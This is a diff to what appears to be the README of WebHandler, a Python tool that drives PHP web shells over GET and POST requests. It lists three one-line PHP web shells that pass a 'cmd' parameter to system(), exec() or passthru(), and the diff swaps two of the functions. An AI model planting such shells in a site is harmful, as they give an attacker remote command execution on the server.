@@ -12,8 +12,8 @@ It sends requests to the server through urllib/urllib2 [Python][] modules.
 
 * WebHandler works for **POST** and **GET** requests:
     - `<?php system($_GET['cmd']); ?>`
-    - `<?php system($_POST['cmd']); ?>`
-    - `<?php system($_REQUEST['cmd']); ?>`
+    - `<?php exec($_POST['cmd']); ?>`
+    - `<?php passthru($_REQUEST['cmd']); ?>`
 
 ### Usage: ###
 ---
